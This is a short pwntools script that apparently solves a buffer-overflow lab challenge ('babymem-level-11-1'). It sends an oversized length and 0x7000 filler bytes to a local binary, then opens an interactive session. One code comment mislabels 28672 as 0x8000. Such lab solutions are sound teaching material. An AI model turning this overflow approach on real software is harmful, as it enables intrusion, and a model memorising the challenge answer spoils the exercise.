from pwn import *

payload_size = b"28672" # 0x8000
payload = b"A" * 0x7000

p = process("./babymem-level-11-1")

print(p.recv(22000))

p.sendline(payload_size)

print(p.recv(22000))

p.sendline(payload)

p.interactive()
